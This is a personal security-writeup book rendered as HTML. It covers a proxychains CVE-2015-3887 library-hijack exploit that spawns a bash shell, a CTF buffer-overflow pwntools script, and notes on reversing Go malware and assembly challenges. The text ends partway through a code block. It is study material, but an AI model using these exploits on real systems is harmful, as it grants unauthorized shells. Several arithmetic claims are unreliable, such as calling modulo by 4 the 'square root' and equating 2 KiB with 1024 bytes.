<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Exploitation Freaks</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.1.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.2.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.2.1.</strong> Mr Snowy</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">4.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">4.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">4.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">4.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">4.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="binary-exploitation-and-reverse-engineering"><a class="header" href="#binary-exploitation-and-reverse-engineering">Binary Exploitation and Reverse Engineering</a></h1>
<p><strong>First things first, welcome in my gitbook !</strong></p>
<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
<ul>
<li>
<p>Disassembly</p>
<ul>
<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
</ul>
</li>
<li>
<p>Decompiling</p>
<ul>
<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
</ul>
</li>
</ul>
<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
<ol>
<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
</ol>
<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.

$ ./configure
$ make &amp;&amp; make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
</code></pre>
<ol start="2">
<li>Write and Compile the exploit</li>
</ol>
<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
<p>Let's write the exploit :)</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int socket(){
    system(&quot;/bin/bash&quot;);
    return 0;
}

</code></pre>
<p>Let's compile the exploit as a shared object</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<ol start="3">
<li>Bypass the default libproxychains4.so using our exploit</li>
</ol>
<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cyber-santa-is-coming-to-town-pwn-mrsnowy"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-mrsnowy">Cyber Santa is Coming to Town (Pwn Mr.Snowy)</a></h1>
<p>So this was the first pwn challenge of the hackthebox 2021 christmas hacking ctf, it was <strong>too much simple</strong> i think but was a great practice whatsoever.</p>
<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving the Challenge</a></h2>
<p>The program starts by telling us, we are in Santa's garden, and there is a suspicious snowman.
We are then asked between 2 choices :</p>
<pre><code>- Investigate
- Let it be
</code></pre>
<p>If you choose Let it be, the program will just quit without doing anything, however if you use the Investigate button the program will use the <strong>read</strong> syscall to <strong>read 0x108 bytes inside a buffer of 64 bytes</strong>, this is a regular buffer overflow, next step was to find the offset at which we can overwrite the return address of the current function we're in. </p>
<p>For this i have sent a <strong>cyclic pattern of 500 bytes</strong> to our program, running it in gdb shows us that the return address starts to be overwritten after 72 bytes, this means we need an offset of <strong>72 bytes before our shellcode or whatever exploit we will use</strong>.</p>
<p>After looking at what i can now do, i found this function called <strong>deactivate_camera</strong>, the body of the functions lookslike it reads a flag file and output it to stdout.</p>
<p>Changing the return address for the <strong>deactivate_camera</strong> function effectively reads the flag, we can now write a python script to automatically solve this challenge :</p>
<pre><code class="language-py">import pwn

pwn.context.arch = &quot;amd64&quot;

elf = ELF(&quot;/challenge/pwn_mr_snowy/mr_snowy&quot;)
io = elf.process()

win_function_addr = elf.sym[&quot;deactivate_camera&quot;]

payload = b&quot;A&quot; * 72 + p64(win_function_addr) 

io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
io.sendlineafter(b&quot;&gt; &quot;, payload)
io.interactive()
</code></pre>
<p>This code should return inside the <strong>deactivate_camera</strong> function and therefore print your flag :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
<p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
<h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
<ul>
<li>Learning about what makes go binaries different than C and C++ binaries.</li>
<li>Identifying techniques for recognizing and conducting analysis of go binaries.</li>
<li>Tips for finding vulnerabilities in go binaries.</li>
<li>Identifying common patterns found in go binaries.</li>
<li>Learning about protections that can be added to go binaries.</li>
</ul>
<h2 id="the-go-assembler"><a class="header" href="#the-go-assembler">The GO Assembler</a></h2>
<ul>
<li>The go compiler is based on plan9 compiler.</li>
<li>Semi-abstract instruction set.</li>
<li>Pseudo-Assembly.</li>
<li>Not a direct representation of the underlying machine (i.e MOV may be a LD)</li>
<li>It also introduces a set of pseudo registers (that you might not have seen before).</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<ul>
<li><strong>Go Tool Objdump</strong>
You can use <strong>objdump</strong> along with <strong>go tool</strong> to dump binary informations (functions, sections,...) </li>
</ul>
<p>You would typically use it the following way.</p>
<pre><code>$ go tool objdump -s &lt;func&gt; &lt;bin&gt; 
$ go tool objdump &lt;arguments&gt; &lt;bin&gt;
</code></pre>
<p>A big advantage of using <strong>go tool objdump</strong> is that you get line numbers in code.This can help you group instructions by operations.</p>
<p><em>Note that pretty much every disassembler does a great job at disassembling go binaries, this includes (r2, ghidra, ida, cutter, binary ninja, hopper, gdb,...).</em></p>
<p><em>Usually it is a best practice to use as many disassembler as you can and compare and catch on differences in the output, i usually like ghidra + ida or ida + binary ninja</em></p>
<h2 id="default-protections-on-go-binaries"><a class="header" href="#default-protections-on-go-binaries">Default Protections on Go Binaries</a></h2>
<p>When you run go build, it should enable <strong>NX</strong> <em>(or No Execute if you prefer)</em> by default on the resulting binary. </p>
<p>However note that <strong>Position Independent Code (PIC or PIE) and Stack Canaries</strong> are usually disabled <strong>by default</strong>, also note that binaries are not stripped.</p>
<p>ROP are a lot easier on go binaries since <strong>PIC (or PIE)</strong> is disabled by default.</p>
<h4 id="how-to-enable-protections-on-go-binaries"><a class="header" href="#how-to-enable-protections-on-go-binaries">How to enable protections on Go binaries.</a></h4>
<ul>
<li>Enable Stack Protections <code>export CGO_LDFLAGS='-fstack-protector'</code></li>
<li>Strip the binary <code>GOOS=linux go build -ldflags=&quot;-s -w&quot;</code></li>
<li>Enable PIE <code>export GOFLAGS='-buildmode=pie'</code></li>
<li>Strip functions names and reduce size <code>Get UPX and pack the file</code></li>
</ul>
<h2 id="searching-for-strings"><a class="header" href="#searching-for-strings">Searching for Strings</a></h2>
<p>Searching for strings in a go binary is a little harder than usual, because they are clumped together in a massive string table.</p>
<ul>
<li>Go does not store null terminated strings.</li>
<li>Strings are clumped together, while keeping a separate table with length information.</li>
<li>This can make it difficult to look for string cross-references.</li>
<li>We can use a project like <a href="https://github.com/carvesystems/gostringsr2">gostringsr2</a> to parse strings.</li>
<li>When working with MachO binaries, you'd have to list strings from .rodata or entire binary</li>
</ul>
<p>The usage of <strong>grep</strong> or filters is basically a must when looking at a go binary strings, because finding yourself in this massive string table can be quite hard.</p>
<p><strong>rabin2</strong>
rabin2 is very useful when looking at go strings and is absolutely straightforward to use.</p>
<pre><code>rabin2 -zz &lt;binary&gt; | grep &lt;char.sequence&gt;
</code></pre>
<p><em>Just like with disassemblers, always use 2-3 different program when looking at strings and check for any differences, it might be hard to see with go binaries since they are statically linked, therefore all library strings should also be in the string table by default.</em></p>
<h2 id="searching-for-functions"><a class="header" href="#searching-for-functions">Searching for functions</a></h2>
<p>Searching for functions is a lot easier than searching for strings in go binaries, which is the opposite of usual C/C++ binaries where strings are by default easier to find than functions.</p>
<p>Most of the time, even <strong>stripped</strong>, functions are still easy to find in go binaries, which is awesome to us anal-ysts.</p>
<h2 id="finding-the-main-function"><a class="header" href="#finding-the-main-function">Finding the main function</a></h2>
<p>Finding the main function is the easiest to find in go binaries, even in stripped ones... to find the main function look for either <strong>main.main or main_main</strong>.</p>
<h2 id="go-stacks"><a class="header" href="#go-stacks">Go Stacks</a></h2>
<p>An important thing to know about Go binaries is that they handle stacks differently, here's the main difference.</p>
<ul>
<li>Go routines have small stacks by default (2 kibibyte = 1024 bytes stack)</li>
<li>Many goroutines will call <strong>morestack</strong> (sym.runtime.morestack_noctxt), to grow the stack (in powers of 2) as needed using stack copying.</li>
<li>This is called because go can't be sure the function will outgrow the stack (i.e recursive functions) given non-deterministic goroutines.</li>
<li>When this occurs, stack grows, pointers in the stack are updated.</li>
<li>Additionally, each function compares its stack pointer against <strong>g-&gt;stackguard</strong> to check for overflow.</li>
<li>Go uses 8 byte alignment on stack.</li>
</ul>
<h2 id="conventions-arguments-and-return-values"><a class="header" href="#conventions-arguments-and-return-values">Conventions (Arguments and Return Values)</a></h2>
<p>Go binaries places return values on the stack, as opposed to C where return values are placed in registers (usually eax for x86).</p>
<p>As for return values, function arguments are also placed on the stack rather than registers.</p>
<p><em>Understanding go internal libraries can significantly help us understand what is going on in the assembly code. Read the Go Docs !</em></p>
<h2 id="go-error-handling"><a class="header" href="#go-error-handling">Go Error Handling</a></h2>
<ul>
<li><strong>error</strong> is an interface.</li>
<li>Error handling is clumsy in go.</li>
<li>Bugs due to unhandled errors are common.</li>
<li>When checking for <strong>error != nil</strong> we load the error vtable and error value.</li>
<li>Then we test if the value is nil.</li>
<li>And branch depending on the result.</li>
</ul>
<h2 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h2>
<p>From now on, the notes are not related to the <strong>Anatomy of Go video</strong>, but on this <a href="https://www.youtube.com/watch?v=_cL-OwU9pFQ">Kaspersky course</a>. I highly recommend that you go watch the video too.</p>
<p>This course is an absolute pearl and helped me a lot learn more about Go and Reverse Engineering, we focus principally on reversing a piece of malware that was used in the SolarWinds breach a little earlier this year, the malware in question is <strong>SunShuttle</strong>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h1>
<p>This course is a must if your going to reverse go malware, it takes a very deep approach in the analysis of a malware named <strong>SunShuttle</strong>, it was notably used as a fully featured backdoored in the <strong>SolarWinds Breach Indicent</strong>, which was one of the biggest breach in the history of hacking.</p>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<p><strong>What you will learn</strong> :</p>
<pre><code>- How to reverse-engineer Go Malware
- Fundamentals of the Go Language
</code></pre>
<p><strong>Why it is important ? :</strong></p>
<pre><code>- Go is increasingly being used among malware authors
- Go binaries cannot be tackled with the usual approach
</code></pre>
<p><strong>In Context :</strong></p>
<pre><code>- [Sunburst Backdoor Kazuar](https://securelist.com/sunburst-backdoor-kazuar)
</code></pre>
<p>If you haven't did already, go see my notes on <a href="https://exploitation.reversing-ninja.com/anatomy-of-a-gopher.html">Anatomy of a Gopher</a> they might greatly help for this course and also don't forget to go watch the SANS talk by hex0punk about Go Reverse Engineer (link in Anatomy of a Gopher notes).</p>
<p><strong>Things to notes about Go before starting to reverse :</strong></p>
<pre><code>- Generates statically-built executables, this makes the program weigh a LOT more than usual dynamically programs, a simple **Hello World** program can weigh up to **2 Megabytes** that is huge !
- Go does not enable PIC or PIE (Position Independent Code or Executable).
- Go does not stripped binaries by default.
- Go does not enable any stack protections (stack canaries).
- Searching for strings in a Go binary can't be quite a pain in the ass.
- Searching for functions is easier than searching for strings, since functions name aren't stripped.
- Go stacks are really small by default (2 kibibytes or 1024 bytes of stack), therefore many goroutines will call **morestack** (sym.runtime.morestack\_noctxt), to grow the stack size (in powers of 2) as needed using **stack copying**.
- Go uses 8 bytes alignment on the stack.
- Each functions compare it's stack pointer agains't **g-&gt;stackguard** to check for overflow.
- Go binaries can return multiple values, therefore it places all the return values on the stack, because 3 return values would not fit inside rax.
- Decompiling go binaries won't be very useful as it doesn't make the code more readable in a C representation.
</code></pre>
<h2 id="practice-reverse-engineering-small-go-programs"><a class="header" href="#practice-reverse-engineering-small-go-programs">Practice Reverse Engineering Small Go Programs</a></h2>
<p>Let's take an example, we will write a small Go program, compile it without optimizations and look at the assembly of it, we will write this small program :</p>
<pre><code class="language-go">package main
import (
    &quot;fmt&quot;
)

// Compiled with disabled optimizations (-gcflags '-N -l')

func main(){
    res := sum(1, 10, 100)
    fmt.Println(&quot;Result = &quot;, res)
}

func sum(a, b, c int) (int){
    return a + b + c
}
</code></pre>
<p><strong>Compile this and open it in IDA or your preferred disassembler and let's start doing some reversing :</strong>
First thing to note is that we don't have the usual function prologue (<strong>push rbp; mov rbp, rsp</strong>), instead functions start by checking if the stack is big enough </p>
<pre><code class="language-x86asm">    mov rcx, gs:28h; 
    mov rcx, [rcx+0]; 
    lea rax, [rsp+var_8]; 
    cmp rax, [rcx+10h]; 
    jbe address
</code></pre>
<p>In this code we check if the argument at [rsp+var_8] is below the address of <strong>rcx</strong>, which should be something like the stack size or address or offset, i am not sure on this one.</p>
<p>If we were below <strong>rcx</strong> or equal to it, we jump to <strong>sym.runtime.morestack_noctxt</strong>, which as said previously will double the stack size using <strong>stack copying</strong>.</p>
<p>Since this code is usually present at the beginning of every function, you can just ignore it (you can change it's color to black in IDA or what i like to do is right click on the block of code i want to hide and click group node, input a text that represent the block code and confirm).</p>
<p>You should end up with something that look like this if you did my way :
<img src="https://i.imgur.com/4WzoSD9.png" alt="Nodes Grouped" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryoasm-level-6"><a class="header" href="#embryoasm-level-6">EmbryoASM Level 6</a></h1>
<p>So this challenge is a little bit harder since we need to compute the modulo of rdi with 256 and rsi with 65536 using only
MOV instructions.</p>
<p>Since i am nowhere near being a shifting, rotating and masking or mathematic wizard, i was struggling at the beginning of this challenge. But thanks to Kanak on discord, he showed us on video a little more how we were supposed to complete the challenge and everything start making sense for me.</p>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<p>Basically the program asks us to modulo with 256 and 65536, note that :</p>
<pre><code>- 4 is the biggest value 2 bits can address.
- 16 is the biggest value 4 bits can address.
- 256 is the biggest value 8 bits can address.
- 65536 is the biggest value 16 bits can address.
</code></pre>
<p>When we talk about modulo, we always think about division and the remainder of it.</p>
<p>But there's something special about modulo with 4, 16, 256, 65536,... :</p>
<pre><code>- When we do modulo with 4 we're basically asking for the last 2 bits of that number (Square root of 4).
- When we do modulo with 16 we're basically asking for the last 4 bits of that number (Square root of 16).
- When we do modulo with 256 we're basically asking for only the last 8 bits of that number (Square root of 256).
- When we modulo with 65536 we're basically asking for only the last 16 bits of that number (Square root of 65536).
</code></pre>
<p>Examples:</p>
<pre><code>   9382 % 4 = 2         &lt;= Here we access the last 2 bits
   9382 % 16 = 6       &lt;= Here we access the last 4 bits
   9382 % 256 = 166     &lt;= Here we access the last 8 bits
   9382 % 65536 = 9382  &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  2019249 % 4 = 1        &lt;= Here we access the last 2 bits
  2019249 % 16 = 1      &lt;= Here we access the last 4 bits
  2019249 % 256 = 177    &lt;= Here we access the last 8 bits
  2019249 % 65536 = 53169 &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  0x12345678 % 4 = 0
  0x12345678 % 16 = 0x8
  0x12345678 % 256 = 0x78
  0x12345678 % 65536 = 0x5678
  0x12345678 % 4294967296 = 0x12345678

  It is sometimes easier to see the pattern using hexadecimal characters.
</code></pre>
<p>But since we can't use division on the challenge we need to know how to compute modulo a different way...</p>
<p>After a bit of research i stumbled across this post on stackoverflow where someone was asking different ways to modulo a certain value, i read that these operations are the same :</p>
<pre><code>    9382 % 4 = 2
    9382 &amp; (4 - 1) = 2        &lt;= Same as the precedent operation

    9382 % 16 = 6
    9382 &amp; (16 - 1) = 6       &lt;= Same as the precedent operation

    9382 % 256 = 166
    9382 &amp; (256 - 1) = 166    &lt;= Same as the precedent operation

    9382 % 65536 = 9382
    9382 &amp; (65536 - 1) = 9382 &lt;= Same as the precedent operation
</code></pre>
<pre><code>    0x12345678 % 16 = 0x8
    0x12345678 &amp; (16 - 1) = 0x8

    0x12345678 % 256 = 0x78
    0x12345678 &amp; (256 - 1) = 0x78
    
    0x12345678 % 65536 = 0x5678
    0x12345678 &amp; (65536 - 1) = 0x5678

    0x12345678 % 4294967296 = 0x12345678
    0x12345678 &amp; (4294967296 - 1) = 0x12345678
</code></pre>
<p>What we're doing is basically <em>masking</em> a number by <strong>AND'ing</strong> with (2 ** n bits we want to access - 1) and this does the same result as doing modulo on (2 ** n bits we want to access).</p>
<p>Let's put this in practice and complete the challenge</p>
<h2 id="solving-the-challenge-1"><a class="header" href="#solving-the-challenge-1">Solving the Challenge</a></h2>
<p>Okay so completing the challenge was pretty simple, we are asked to do the following :</p>
<pre><code>Welcome to EmbryoASMLevel6
==================================================
To interact with any level you will send raw bytes over stdin to this program.
To efficiently solve these problems, first run it once to see what you need,
then craft, assemble, and pipe your bytes to this program.

In this level you will be working with registers. You will be asked to modify
or read from registers_use.

We will now set some values in memory dynamically before each run. On each run
the values will change. This means you will need to do some type of formulaic
operation with registers_use. We will tell you which registers_use are set beforehand
and where you should put the result. In most cases, its rax.

Another cool concept in x86 is the independent access to lower register bytes.
Each register in x86 is 64 bits in size, in the previous levels we have accessed
the full register using rax, rdi or rsi. We can also access the lower bytes of
each register using different register names. For example the lower
32 bits of rax can be accessed using eax, lower 16 bits using ax,
lower 8 bits using al, etc.
MSB                                    LSB
+----------------------------------------+
|                   rax                  |
+--------------------+-------------------+
                     |        eax        |
                     +---------+---------+
                               |   ax    |
                               +----+----+
                               | ah | al |
                               +----+----+
Lower register bytes access is applicable to all registers_use.

Using only the following instruction(s):
mov
Please compute the following:
rax = rdi modulo 256
rbx = rsi module 65536

We will now set the following in preparation for your code:
rdi = 0x57c5
rsi = 0x4fe709fc


Please give me your assembly in bytes (up to 0x1000 bytes):
</code></pre>
<p>Note that on x64 you can access the lower 8 bits of rsi and rdi, using sil and dil, respectively. </p>
<p>This mean we can complete this challenge using only the mov instruction as asked.</p>
<pre><code class="language-x86asm">.global _start
